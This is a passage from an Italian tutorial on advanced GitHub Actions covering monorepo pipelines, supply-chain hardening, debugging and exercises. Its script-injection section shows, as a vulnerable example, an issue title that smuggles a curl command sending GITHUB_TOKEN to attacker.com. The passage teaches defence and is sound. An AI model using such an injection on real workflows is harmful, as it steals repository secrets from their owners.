  test-backend:
    needs: detect-changes
    if: needs.detect-changes.outputs.backend == 'true' || needs.detect-changes.outputs.shared == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cd apps/api && npm ci && npm test

  deploy-infra:
    needs: detect-changes
    if: needs.detect-changes.outputs.infra == 'true' && github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: infrastructure
    steps:
      - uses: actions/checkout@v4
      - run: cd terraform && terraform plan
```

### Pattern: Matrix Dinamica da Cambiamenti nel Monorepo

Combinare la detection dei cambiamenti con la matrix strategy dinamica per la massima efficienza:

```yaml
name: Smart Monorepo CI
on:
  pull_request:

jobs:
  detect:
    runs-on: ubuntu-latest
    outputs:
      packages: ${{ steps.find.outputs.packages }}
      has_changes: ${{ steps.find.outputs.has_changes }}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Find changed packages
        id: find
        run: |
          CHANGED=$(git diff --name-only origin/main...HEAD | \
            grep '^packages/' | \
            cut -d'/' -f2 | \
            sort -u | \
            jq -R -s 'split("\n") | map(select(length > 0))')

          if [ "$CHANGED" = "[]" ]; then
            echo "has_changes=false" >> "$GITHUB_OUTPUT"
          else
            echo "has_changes=true" >> "$GITHUB_OUTPUT"
          fi
          echo "packages=$CHANGED" >> "$GITHUB_OUTPUT"

  test:
    needs: detect
    if: needs.detect.outputs.has_changes == 'true'
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        package: ${{ fromJSON(needs.detect.outputs.packages) }}
    steps:
      - uses: actions/checkout@v4
      - name: Test ${{ matrix.package }}
        run: |
          cd packages/${{ matrix.package }}
          npm ci
          npm test
```

### Required Status Checks per Monorepo

Un problema comune nei monorepo con path filtering: i required status checks su GitHub bloccano il merge delle PR perché i job condizionali risultano "skipped" anziché "passed". La soluzione è un job gate:

```yaml
jobs:
  detect-changes:
    # ... come sopra

  test-frontend:
    needs: detect-changes
    if: needs.detect-changes.outputs.frontend == 'true'
    # ... test frontend

  test-backend:
    needs: detect-changes
    if: needs.detect-changes.outputs.backend == 'true'
    # ... test backend

  # Job gate: sempre eseguito, risultato usato come required status check
  ci-gate:
    runs-on: ubuntu-latest
    needs: [test-frontend, test-backend]
    if: always()
    steps:
      - name: Check results
        run: |
          RESULTS="${{ toJSON(needs.*.result) }}"
          echo "Job results: $RESULTS"
          # Fallire se qualche job è fallito (non skipped)
          if echo "$RESULTS" | jq -e 'map(select(. == "failure")) | length > 0' > /dev/null; then
            echo "::error::One or more required jobs failed"
            exit 1
          fi
          echo "All required jobs passed or were skipped"
```

---

## Security Hardening e Supply Chain

La sicurezza dei workflow è diventata una priorità critica dopo diversi incidenti di supply chain attack nel 2024-2025, tra cui la compromissione di `tj-actions/changed-files` (CVE-2025-30066), che ha dimostrato come un'action compromessa possa esfiltrare segreti da migliaia di repository.

### SHA Pinning delle Actions

Il SHA pinning è la pratica di riferire le actions con l'hash SHA del commit invece del tag. Da agosto 2025, GitHub supporta il SHA pinning enforcement a livello di policy organizzativa, causando il fallimento dei workflow che usano actions non pinnate.

```yaml
# ERRATO: riferimento per tag (vulnerabile a tag tampering)
- uses: actions/checkout@v4
- uses: actions/setup-node@v4

# CORRETTO: riferimento per SHA completo
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
- uses: actions/setup-node@39cd14951b08e6288cdbe23751ba425a0a16be9a # v4.1.0

# Aggiungere il tag come commento per leggibilità
# Usare Dependabot per aggiornare automaticamente i SHA
```

Configurazione Dependabot per aggiornare i SHA delle actions:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    # Dependabot aggiorna automaticamente i SHA mantenendo i commenti
```

### Permessi Least Privilege

Ogni workflow deve dichiarare esplicitamente i permessi minimi necessari:

```yaml
# A livello di workflow: nessun permesso di default
permissions: {}

jobs:
  test:
    runs-on: ubuntu-latest
    # Solo lettura del codice
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4
      - run: npm test

  deploy:
    needs: test
    runs-on: ubuntu-latest
    # Solo i permessi necessari per questo job
    permissions:
      contents: read
      id-token: write      # Per OIDC
      packages: write      # Per GHCR
      attestations: write  # Per attestazioni
    steps:
      - uses: actions/checkout@v4
      - run: ./deploy.sh
```

### Permessi GITHUB_TOKEN

```yaml
# Elenco completo dei permessi GITHUB_TOKEN
permissions:
  actions: read|write|none
  attestations: read|write|none
  checks: read|write|none
  contents: read|write|none
  deployments: read|write|none
  discussions: read|write|none
  id-token: write|none
  issues: read|write|none
  packages: read|write|none
  pages: read|write|none
  pull-requests: read|write|none
  repository-projects: read|write|none
  security-events: read|write|none
  statuses: read|write|none
```

### pull_request vs pull_request_target

Questa distinzione è critica per la sicurezza. `pull_request_target` esegue nel contesto del branch target (tipicamente main) e ha accesso ai segreti — questo è pericoloso con PR da fork:

```yaml
# SICURO: pull_request — esegue nel contesto del fork, no accesso ai segreti
on:
  pull_request:
    types: [opened, synchronize]

# PERICOLOSO se usato male: pull_request_target — esegue nel contesto di main
# Ha accesso ai segreti e permessi di scrittura
on:
  pull_request_target:
    types: [opened, synchronize]

# Se DEVI usare pull_request_target (es. per labeling), NON fare checkout del codice della PR
jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      # CORRETTO: usa solo l'API, non il codice della PR
      - uses: actions/labeler@v5

      # ERRATO e PERICOLOSO: checkout del codice della PR con pull_request_target
      # - uses: actions/checkout@v4
      #   with:
      #     ref: ${{ github.event.pull_request.head.sha }}
      # - run: npm test  # Esegue codice potenzialmente malevolo con i segreti di main!
```

### Script Injection Prevention

```yaml
# VULNERABILE: interpolazione diretta di input utente in run
- run: echo "Title: ${{ github.event.issue.title }}"
  # Un titolo come "test"; curl attacker.com/steal?token=$GITHUB_TOKEN
  # eseguirebbe comandi arbitrari

# SICURO: passare input tramite variabili d'ambiente
- name: Print issue title
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  run: echo "Title: $ISSUE_TITLE"
  # La variabile è trattata come stringa, non interpretata come comando

# VULNERABILE: interpolazione in if conditions
if: github.event.issue.title == 'deploy'
  # Sicuro solo perché if usa contesti, non shell

# Per workflow attivati da utenti esterni (issues, PR comments),
# MAI interpolare input utente direttamente in run:
```

### Protezione della Supply Chain — Checklist Completa

```yaml
# 1. SHA pinning di tutte le actions di terze parti
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

# 2. Permessi minimi a livello di workflow
permissions: {}

# 3. Permessi specifici per job
permissions:
  contents: read

# 4. Non usare pull_request_target con checkout del codice della PR

# 5. Non interpolare input utente in run:

# 6. Usare OIDC invece di credenziali statiche

# 7. Verificare la provenienza degli artifacts con attestazioni

# 8. Monitorare le dipendenze con Dependabot

# 9. Abilitare il secret scanning nel repository

# 10. Audit regolare dei workflow con strumenti come actionlint
```

### L'Incidente tj-actions/changed-files (CVE-2025-30066)

Nel marzo 2025, l'action `tj-actions/changed-files` è stata compromessa. L'attaccante ha modificato il codice dell'action per esfiltrare i segreti di tutti i workflow che la utilizzavano, iniettando codice malevolo che leggeva le variabili d'ambiente (inclusi i segreti mascherati) e le inviava a un server esterno.

Lezioni apprese:
- Il SHA pinning avrebbe impedito l'uso della versione compromessa
- Il permesso `contents: read` avrebbe limitato il danno
- La review delle dipendenze Actions deve essere trattata con la stessa serietà delle dipendenze npm/pip
- Un WAF (Web Application Firewall) o policy di egress restrittiva sul runner avrebbe bloccato l'esfiltrazione

### Strumenti di Security Auditing

```bash
# actionlint — linter statico per workflow GitHub Actions
# Verifica errori di sintassi, pattern insicuri, e best practices
actionlint .github/workflows/ci.yml

# Installazione
go install github.com/rhysd/actionlint/cmd/actionlint@latest
# oppure
brew install actionlint

# zizmor — scanner di sicurezza per workflow
# Identifica pattern vulnerabili come script injection, permessi eccessivi, ecc.
pip install zizmor
zizmor .github/workflows/

# StepSecurity Harden Runner
# Monitora le connessioni di rete dal runner e blocca il traffico sospetto
- uses: step-security/harden-runner@v2
  with:
    egress-policy: audit  # o 'block' per bloccare traffico non autorizzato
    allowed-endpoints: >
      api.github.com:443
      ghcr.io:443
      registry.npmjs.org:443
```

---

## Best Practices

### Matrix Strategy

1. **Fail-fast false per CI**: In CI, è utile vedere tutti i fallimenti, non solo il primo.
2. **Limitare il parallelismo**: Troppi job paralleli possono saturare i runner.
3. **Matrix dinamiche**: Per monorepo, generare la matrice basandosi sui file modificati.

### Caching

1. **Key specifiche**: Includere OS, versione del tool e hash del lockfile nella key.
2. **Restore-keys per fallback**: Permettere il riutilizzo di cache parziali.
3. **Monitorare l'uso della cache**: La cache ha un limite di 10 GB per repository.

### Artifacts

1. **Retention minima**: Non conservare artifacts più del necessario (default 90 giorni, riducibile).
2. **Compressione**: Comprimere gli artifacts prima dell'upload per risparmiare tempo e spazio.
3. **Naming chiaro**: Usare nomi descrittivi per gli artifacts.

### Secrets

1. **OIDC sempre**: Preferire OIDC a credenziali statiche per AWS/Azure/GCP.
2. **Rotazione regolare**: Ruotare i segreti periodicamente.
3. **Environment secrets**: Usare environment secrets per separare staging e produzione.

### Self-Hosted Runners

1. **Effimeri**: Usare runner effimeri per evitare contaminazione tra job.
2. **Autoscaling**: Usare ARC o soluzioni simili per scalare automaticamente.
3. **Non per repository pubblici**: I runner self-hosted non sono sicuri per repository pubblici.

### Concurrency

1. **Cancel-in-progress per CI**: Cancellare i run precedenti quando arriva un nuovo push su feature branch.
2. **Mai cancellare i deploy**: Usare `cancel-in-progress: false` per i deploy per evitare stati inconsistenti.
3. **Gruppi specifici**: Usare gruppi di concurrency che includono il branch o il PR number per evitare conflitti tra diversi feature branch.

### Reusable Workflows e Composite Actions

1. **Versionare con tag semantici**: Usare tag come `v1`, `v1.2`, `v1.2.3` per i workflow condivisi.
2. **SHA pinning per produzione**: In produzione, usare sempre il SHA completo del commit.
3. **Documentare gli input/output**: Ogni workflow e action riutilizzabile deve avere input e output ben documentati.
4. **Testare le actions condivise**: Creare un workflow di test nel repository delle actions condivise che verifica il funzionamento corretto.
5. **Composite per step, reusable per job**: Usare composite actions per raggruppare step ripetuti; usare reusable workflows per standardizzare interi job.

### Security

1. **SHA pinning di tutte le actions di terze parti**: Mai usare tag mutabili in produzione.
2. **Permessi minimi**: Dichiarare `permissions: {}` a livello di workflow e specificare solo quelli necessari per job.
3. **OIDC per cloud**: Eliminare credenziali statiche dove possibile.
4. **Mai interpolare input utente in `run:`**: Usare variabili d'ambiente.
5. **Audit regolare**: Usare actionlint, zizmor, e StepSecurity per verificare la sicurezza dei workflow.
6. **Dependabot per actions**: Configurare Dependabot per aggiornare automaticamente le actions.

### Performance

1. **Cachare tutto il cachabile**: Dipendenze, build intermedie, Docker layers.
2. **Parallelizzare i job**: Strutturare la pipeline per massimizzare il parallelismo.
3. **Usare larger runners per build pesanti**: Il tempo risparmiato spesso giustifica il costo extra.
4. **ARM64 per build Linux**: Risparmio del 37% con prestazioni comparabili.
5. **Build incrementali**: Cachare il build output (es. `.next/cache` per Next.js) per build incrementali.

### Job Summaries

Usare i job summaries per fornire informazioni leggibili direttamente nell'interfaccia di GitHub:

```yaml
- name: Generate summary
  run: |
    echo "## Build Results" >> "$GITHUB_STEP_SUMMARY"
    echo "" >> "$GITHUB_STEP_SUMMARY"
    echo "| Metric | Value |" >> "$GITHUB_STEP_SUMMARY"
    echo "|--------|-------|" >> "$GITHUB_STEP_SUMMARY"
    echo "| Tests passed | 142/142 |" >> "$GITHUB_STEP_SUMMARY"
    echo "| Coverage | 87.3% |" >> "$GITHUB_STEP_SUMMARY"
    echo "| Build time | 2m 34s |" >> "$GITHUB_STEP_SUMMARY"
    echo "| Bundle size | 145 KB |" >> "$GITHUB_STEP_SUMMARY"
    echo "" >> "$GITHUB_STEP_SUMMARY"
    echo "> Deploy URL: https://staging.example.com" >> "$GITHUB_STEP_SUMMARY"
```

### Annotations

```yaml
# Aggiungere warning e errori visibili nella PR
- name: Check bundle size
  run: |
    SIZE=$(stat -f%z dist/app.js 2>/dev/null || stat -c%s dist/app.js)
    if [ "$SIZE" -gt 153600 ]; then
      echo "::warning file=dist/app.js::Bundle size is ${SIZE} bytes (exceeds 150KB budget)"
    fi
    if [ "$SIZE" -gt 307200 ]; then
      echo "::error file=dist/app.js::Bundle size is ${SIZE} bytes (exceeds 300KB hard limit)"
      exit 1
    fi
```

---

## Troubleshooting

### Cache Miss Frequente

```bash
# Verificare la key della cache
# La key deve essere deterministica e basata sui file corretti
# Errore comune: hashFiles pattern non matcha nessun file

# Debug: verificare l'hash
- run: echo "${{ hashFiles('**/package-lock.json') }}"
# Se vuoto, il pattern non trova file
```

### Artifact Upload Lento

```yaml
# Ridurre la dimensione degli artifacts
- uses: actions/upload-artifact@v4
  with:
    name: build
    path: |
      dist/
      !dist/**/*.map        # Escludere source maps
      !dist/**/*.d.ts       # Escludere type declarations
    compression-level: 9    # Massima compressione
```

### Self-Hosted Runner Offline

```bash
# Verificare lo stato del servizio
sudo ./svc.sh status

# Controllare i log
journalctl -u actions.runner.* -f

# Rigenerare il token di registrazione
# Settings > Actions > Runners > Re-register
```

### Reusable Workflow Non Trovato

```yaml
# Causa comune: ref mancante o errato
# Corretto:
uses: org/repo/.github/workflows/ci.yml@main
uses: org/repo/.github/workflows/ci.yml@v1.0.0

# Errato:
uses: org/repo/.github/workflows/ci.yml  # Manca il ref!
```

### Debug Logging Avanzato

Per diagnosticare problemi nei workflow, GitHub Actions offre due livelli di debug logging:

#### Step Debug Logging

```bash
# Abilitare il debug logging per tutti i workflow
# Settings > Secrets > New repository secret:
# Nome: ACTIONS_STEP_DEBUG
# Valore: true

# Oppure come repository variable (preferibile, non sensibile):
# Settings > Variables > New repository variable:
# Nome: ACTIONS_STEP_DEBUG
# Valore: true
```

Quando abilitato, i log includono messaggi con prefisso `::debug::` che forniscono informazioni dettagliate su ogni step, inclusi i valori degli input, i comandi eseguiti e le espressioni valutate.

#### Runner Diagnostic Logging

```bash
# Abilitare il diagnostic logging del runner
# Settings > Secrets/Variables:
# Nome: ACTIONS_RUNNER_DEBUG
# Valore: true

# Genera due file di log aggiuntivi nell'archivio dei log:
# - Runner process log: info sulla configurazione del runner
# - Worker process log: dettagli sull'esecuzione del job
```

#### Debug durante il Re-run

GitHub permette di abilitare il debug logging per un singolo re-run senza modificare i segreti del repository:

1. Andare alla pagina del workflow run fallito
2. Cliccare "Re-run jobs"
3. Selezionare la checkbox "Enable debug logging"
4. Il re-run includerà log dettagliati solo per quella esecuzione

### Test Locale con act

`act` è un tool open source che permette di eseguire i workflow GitHub Actions localmente, utile per debugging e sviluppo rapido:

```bash
# Installazione
brew install act       # macOS
# oppure
curl -s https://raw.githubusercontent.com/nektos/act/master/install.sh | sudo bash

# Eseguire tutti i workflow attivati da push
act push

# Eseguire un job specifico
act -j test

# Eseguire con un evento specifico
act pull_request

# Passare segreti
act -s GITHUB_TOKEN=ghp_xxx -s API_KEY=abc123

# Usare un'immagine Docker specifica per il runner
act --platform ubuntu-latest=catthehacker/ubuntu:act-latest

# Dry run (mostrare cosa verrebbe eseguito)
act -n

# Specificare il file del workflow
act -W .github/workflows/ci.yml
```

Limitazioni di `act`:
- Non supporta tutti i servizi container
- Non simula perfettamente l'ambiente GitHub-hosted
- Alcune actions di terze parti potrebbero non funzionare
- OIDC non è disponibile localmente

### Errori Comuni e Soluzioni

| Errore | Causa | Soluzione |
|--------|-------|-----------|
| `Resource not accessible by integration` | GITHUB_TOKEN con permessi insufficienti | Aggiungere i permessi necessari al job |
| `Process completed with exit code 1` | Comando shell fallito | Controllare i log per l'errore specifico |
| `No such file or directory` | File non trovato dopo il checkout | Verificare il path e il ref del checkout |
| `Cache not found` | Key della cache non corrisponde | Controllare il pattern di hashFiles |
| `Timeout` | Job ha superato il limite di 6h (runner hosted) | Ottimizzare il job o usare self-hosted |
| `Error: HttpError: rate limit exceeded` | Troppi API calls in poco tempo | Aggiungere delay o usare conditional checks |
| `Your workflow file was invalid` | Errore di sintassi YAML | Usare actionlint per validare |
| `Unrecognized named-value: inputs` | Input usato fuori dal contesto `workflow_call`/`workflow_dispatch` | Usare `github.event.inputs` per trigger diversi |

### Debugging delle Espressioni

```yaml
# Stampare il valore di un'espressione per debug
- name: Debug context
  run: |
    echo "github.ref: ${{ github.ref }}"
    echo "github.event_name: ${{ github.event_name }}"
    echo "github.actor: ${{ github.actor }}"

# Stampare un intero contesto come JSON formattato
- name: Dump GitHub context
  env:
    GITHUB_CONTEXT: ${{ toJSON(github) }}
  run: echo "$GITHUB_CONTEXT" | jq .

# Stampare tutti i contesti (utile per debugging)
- name: Dump all contexts
  env:
    GITHUB_CONTEXT: ${{ toJSON(github) }}
    JOB_CONTEXT: ${{ toJSON(job) }}
    STEPS_CONTEXT: ${{ toJSON(steps) }}
    RUNNER_CONTEXT: ${{ toJSON(runner) }}
    STRATEGY_CONTEXT: ${{ toJSON(strategy) }}
    MATRIX_CONTEXT: ${{ toJSON(matrix) }}
  run: |
    echo "::group::GitHub Context"
    echo "$GITHUB_CONTEXT" | jq .
    echo "::endgroup::"
    echo "::group::Job Context"
    echo "$JOB_CONTEXT" | jq .
    echo "::endgroup::"
```

### Debugging di OIDC

```yaml
# Verificare il token OIDC e le sue claim
- name: Debug OIDC token
  run: |
    # Richiedere il token OIDC
    OIDC_TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r '.value')

    # Decodificare il payload (seconda parte del JWT)
    echo "$OIDC_TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .

    # Output atteso:
    # {
    #   "sub": "repo:org/repo:ref:refs/heads/main",
    #   "aud": "sts.amazonaws.com",
    #   "iss": "https://token.actions.githubusercontent.com",
    #   "repository": "org/repo",
    #   "ref": "refs/heads/main",
    #   ...
    # }
  env:
    ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    ACTIONS_ID_TOKEN_REQUEST_URL: ${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
```

### Workflow Visualization e Log Grouping

```yaml
# Raggruppare i log per leggibilità
- name: Build and test
  run: |
    echo "::group::Installing dependencies"
    npm ci
    echo "::endgroup::"

    echo "::group::Running linter"
    npm run lint
    echo "::endgroup::"

    echo "::group::Running tests"
    npm test
    echo "::endgroup::"

    echo "::group::Building application"
    npm run build
    echo "::endgroup::"

# Mascherare valori sensibili nei log
- name: Process sensitive data
  run: |
    DERIVED_SECRET=$(echo "$API_KEY" | sha256sum | cut -c1-16)
    echo "::add-mask::$DERIVED_SECRET"
    echo "Using derived key: $DERIVED_SECRET"
  env:
    API_KEY: ${{ secrets.API_KEY }}
```

---

## Riferimenti

- **GitHub Docs — Matrix Strategy**: https://docs.github.com/en/actions/using-jobs/using-a-matrix-for-your-jobs
- **GitHub Docs — Caching**: https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows
- **GitHub Docs — Artifacts**: https://docs.github.com/en/actions/using-workflows/storing-workflow-data-as-artifacts
- **GitHub Docs — Secrets**: https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions
- **GitHub Docs — Environments**: https://docs.github.com/en/actions/deployment/targeting-different-environments
- **GitHub Docs — Reusable Workflows**: https://docs.github.com/en/actions/using-workflows/reusing-workflows
- **GitHub Docs — Composite Actions**: https://docs.github.com/en/actions/creating-actions/creating-a-composite-action
- **GitHub Docs — Self-Hosted Runners**: https://docs.github.com/en/actions/hosting-your-own-runners
- **GitHub Docs — OIDC**: https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect
- **Actions Runner Controller**: https://github.com/actions/actions-runner-controller
- **GitHub Docs — Concurrency**: https://docs.github.com/en/actions/concepts/workflows-and-actions/concurrency
- **GitHub Docs — Expressions**: https://docs.github.com/en/actions/learn-github-actions/expressions
- **GitHub Docs — Artifact Attestations**: https://docs.github.com/en/actions/concepts/security/artifact-attestations
- **GitHub Docs — SLSA Build Level 3**: https://docs.github.com/actions/security-guides/using-artifact-attestations-and-reusable-workflows-to-achieve-slsa-v1-build-level-3
- **GitHub Docs — Custom Actions**: https://docs.github.com/actions/creating-actions/about-custom-actions
- **GitHub Docs — Larger Runners**: https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners
- **GitHub Docs — Deployment Protection Rules**: https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/configuring-custom-deployment-protection-rules
- **GitHub Changelog — ARM64 Runners GA**: https://github.blog/changelog/2024-09-03-github-actions-arm64-linux-and-windows-runners-are-now-generally-available/
- **GitHub Changelog — 25 Workflow Dispatch Inputs**: https://github.blog/changelog/2025-12-04-actions-workflow-dispatch-workflows-now-support-25-inputs/
- **GitHub Changelog — SHA Pinning Policy**: https://github.blog/changelog/2025-08-15-github-actions-policy-now-supports-blocking-and-sha-pinning-actions/
- **GitHub Changelog — SLSA Build Level 3**: https://github.blog/changelog/2026-01-20-strengthen-your-supply-chain-with-code-to-cloud-traceability-and-slsa-build-level-3-security/
- **dorny/paths-filter**: https://github.com/dorny/paths-filter
- **actions/toolkit**: https://github.com/actions/toolkit
- **actionlint**: https://github.com/rhysd/actionlint
- **act — Run GitHub Actions Locally**: https://github.com/nektos/act

---

## Esercizi Pratici

### Esercizio 1: Matrix Strategy Multi-Piattaforma

Progetta un workflow CI con matrix strategy per un progetto Node.js che deve supportare:
- Node.js 18, 20, 22
- Ubuntu, macOS, Windows
- Con `fail-fast: false` per vedere tutti i fallimenti

```yaml
# 1. Creare il workflow .github/workflows/matrix-ci.yml
# 2. Definire la matrice con include/exclude:
#    - Escludere Node 18 su Windows (non supportato)
#    - Includere una combinazione extra con flag experimental
# 3. Usare la matrice per setup-node e per il nome del job
# 4. Aggiungere max-parallel: 4 per non saturare i runner
# 5. Verificare: tutti i job girano in parallelo, il report mostra la matrice
```

**Criteri di successo:** la matrice genera le combinazioni corrette, i job falliti non bloccano gli altri, il report è leggibile.

### Esercizio 2: Cache e Artifacts tra Job

Costruisci un workflow con tre job separati che condividono dati:

```yaml
# Job 1 (build): compila il progetto, salva l'artifact dist/
# Job 2 (test): scarica l'artifact, esegue i test
# Job 3 (report): scarica i risultati dei test, genera report di copertura

# Requisiti:
# 1. Usare actions/cache@v4 per le dipendenze npm (key basata su lockfile + OS)
# 2. Usare actions/upload-artifact@v4 e download-artifact@v4 per dist/ e coverage/
# 3. Impostare retention-days: 7 sugli artifacts
# 4. Aggiungere compression-level: 9 per ridurre upload
# 5. Verificare cache hit/miss nei log del workflow
```

### Esercizio 3: Composite Action Riutilizzabile

Crea una composite action che standardizzi il setup di un progetto:

```yaml
# .github/actions/project-setup/action.yml
# 1. Input: node-version (default: 20), package-manager (npm|pnpm|yarn)
# 2. Output: cache-hit (boolean)
# 3. Step: setup Node.js con la versione specificata
# 4. Step: cache delle dipendenze (path e key variano per package manager)
# 5. Step: install delle dipendenze (comando varia per package manager)
# 6. Step: verifica versioni installate

# Testare la composite action in un workflow:
# - Chiamarla con pnpm e node 20
# - Chiamarla con npm e node 18
# - Verificare che il cache hit funzioni al secondo run
```

### Esercizio 4: Environment con Protection Rules

Configura un deployment pipeline con tre environment protetti:

```yaml
# 1. Creare gli environment su GitHub: development, staging, production
# 2. Configurare protection rules:
#    - development: nessuna protezione (deploy automatico)
#    - staging: richiede che il job "test" sia passato
#    - production: richiede approvazione manuale da 2 reviewer + wait timer 5 min
# 3. Configurare environment secrets separati (DATABASE_URL diverso per ambiente)
# 4. Creare il workflow di deploy con jobs sequenziali:
#    test → deploy-dev → deploy-staging → deploy-production
# 5. Verificare: il deploy in production si blocca in attesa di approvazione
```

### Esercizio 5: Reusable Workflow Cross-Repository

Crea un reusable workflow in un repository condiviso e consumalo da un altro:

```yaml
# Repository: org/shared-workflows
# File: .github/workflows/standard-ci.yml
# 1. Definire workflow_call con inputs (language, node-version) e secrets (deploy_token)
# 2. Implementare: checkout → setup → install → lint → test → build
# 3. Usare outputs per esportare la versione buildata

# Repository: org/my-app
# File: .github/workflows/ci.yml
# 4. Chiamare il reusable workflow con uses: org/shared-workflows/.github/workflows/standard-ci.yml@v1
# 5. Passare inputs e secrets
# 6. Aggiungere un job successivo che usa l'output del reusable workflow
# 7. Testare con un tag @v1 sul repository shared-workflows
```

### Esercizio 6: Pipeline Monorepo con Path Filtering

Implementa una CI efficiente per un monorepo con tre pacchetti:

```yaml
# Struttura del monorepo:
# packages/
#   frontend/
#   api/
#   shared/

# 1. Usare dorny/paths-filter@v3 per rilevare i cambiamenti
# 2. Creare job condizionali per ogni pacchetto
# 3. Il pacchetto 'shared' deve triggherare i test di frontend E api
# 4. Aggiungere un job 'ci-gate' che funge da required status check
# 5. Implementare una matrix dinamica basata sui pacchetti modificati
# 6. Verificare: modificare solo frontend → solo i test di frontend girano
```

### Esercizio 7: Security Hardening Completo

Applica tutte le best practices di sicurezza a un workflow esistente:

```yaml
# 1. Convertire tutti i riferimenti ad actions da tag a SHA
# 2. Aggiungere permissions: {} a livello di workflow
# 3. Specificare permessi minimi per ogni job
# 4. Sostituire credenziali statiche AWS con OIDC
# 5. Aggiungere StepSecurity Harden Runner
# 6. Configurare Dependabot per le actions
# 7. Aggiungere artifact attestations al build
# 8. Verificare con actionlint che non ci siano problemi di sicurezza
```

### Esercizio 8: Custom JavaScript Action

Crea una JavaScript action personalizzata:

```yaml
# 1. Creare la struttura: action.yml, src/index.ts, package.json
# 2. L'action deve analizzare le PR e aggiungere label in base alla dimensione
# 3. Usare @actions/core per input/output e @actions/github per l'API
# 4. Compilare con ncc per creare un singolo file dist/index.js
# 5. Aggiungere test unitari
# 6. Pubblicare l'action e usarla in un workflow
```

---

## Letture Consigliate

- **Libro**: "Learning GitHub Actions" di Brent Laster, O'Reilly Media, 2024 — copertura completa di workflow avanzati, custom actions e sicurezza
- **Libro**: "Automating Workflows with GitHub Actions" di Priscila Heller, Packt, 2024 — focus su composite actions e reusable workflows
- **GitHub Blog**: "How to build your first JavaScript action" — https://github.blog/developer-skills/github/creating-github-actions-in-javascript/ (consultato: 2026-05-24)
- **GitHub Blog**: "Reusable workflows are generally available" — https://github.blog/changelog/2022-01-25-github-actions-reusable-workflows-are-generally-available/ (consultato: 2026-05-24)
- **GitHub Engineering**: "How we use GitHub Actions for CI/CD at GitHub" — https://github.blog/engineering/engineering-principles/how-we-build-containerized-services-at-github-using-github/ (consultato: 2026-05-24)
- **GitHub Universe talks**: sessioni su GitHub Actions avanzate, disponibili su https://githubuniverse.com/ (consultato: 2026-05-24)

---

## Collegamenti Incrociati

| Modulo | Collegamento | Relazione |
|--------|-------------|-----------|
| 04 | [04-github-actions.md](04-github-actions.md) | Fondamenti di GitHub Actions — prerequisito diretto |
| 17 | [17-github-actions-workflow-sintassi.md](17-github-actions-workflow-sintassi.md) | Sintassi YAML dei workflow — prerequisito per matrix e concurrency |
| 19 | [19-github-actions-ci-cd-ricette.md](19-github-actions-ci-cd-ricette.md) | Ricette CI/CD — applicazione pratica delle tecniche avanzate |
| 21 | [21-github-actions-self-hosted-runners.md](21-github-actions-self-hosted-runners.md) | Self-hosted runners — approfondimento su runner personalizzati |
| 08 | [08-git-hooks-automazione.md](08-git-hooks-automazione.md) | Git hooks — automazione locale complementare alle Actions |
| 16 | [16-github-security-scanning.md](16-github-security-scanning.md) | Security scanning — integrazione con environment protection |
| 24 | [24-devops-completo-con-github.md](24-devops-completo-con-github.md) | Pipeline DevOps completa — usa tutte le tecniche avanzate |
| 26 | [26-oidc-cloud-credentials.md](26-oidc-cloud-credentials.md) | OIDC per cloud — credenziali sicure negli environments |
| 12 | [12-github-repository-management.md](12-github-repository-management.md) | Repository management — settings e configurazione base |

---

## Glossario Locale

| Termine | Definizione |
|---------|------------|
| **Artifact** | File o directory prodotti da un job e condivisi con altri job o scaricati dopo l'esecuzione del workflow |
| **Artifact Attestation** | Documento crittograficamente firmato che lega un artifact al suo repository sorgente e al workflow di build, nel formato in-toto con firma Sigstore |
| **Cache key** | Stringa deterministica (tipicamente basata su OS + tool version + hash del lockfile) che identifica una cache salvata |
| **Cache scoping** | Meccanismo di isolamento della cache per branch: i feature branch possono leggere le cache del proprio branch e del branch predefinito, ma non di altri branch |
| **Composite action** | Action personalizzata composta da step multipli definiti in YAML, eseguita nello stesso runner del job chiamante |
| **Concurrency group** | Meccanismo che limita l'esecuzione simultanea di workflow, cancellando o mettendo in coda i run duplicati |
| **Custom deployment protection rule** | Regola che integra servizi di terze parti (Datadog, Honeycomb, ServiceNow) come gate automatici per i deploy |
| **Docker action** | Action personalizzata che esegue il codice in un container Docker, garantendo un ambiente controllato e isolato (solo Linux) |
| **Environment** | Contesto di deploy (staging, production) con secrets dedicati e protection rules configurabili |
| **Fail-fast** | Parametro della matrix strategy: se `true` (default), cancella tutti i job quando uno fallisce |
| **JavaScript action** | Action personalizzata scritta in JavaScript/TypeScript, eseguita nativamente sul runner con accesso al toolkit @actions |
| **Larger runner** | Runner GitHub-hosted con risorse maggiori (fino a 64 vCPU, 256 GB RAM), disponibile per piani Team e Enterprise Cloud |
| **Matrix strategy** | Configurazione che genera automaticamente job multipli combinando variabili (OS, versione, ecc.) |
| **OIDC (OpenID Connect)** | Protocollo di autenticazione usato per ottenere credenziali cloud temporanee senza secrets statici |
| **Path filtering** | Meccanismo per eseguire job selettivamente in base ai file modificati, essenziale per monorepo |
| **Protection rule** | Regola che controlla l'accesso a un environment: approvazione manuale, wait timer, branch restriction |
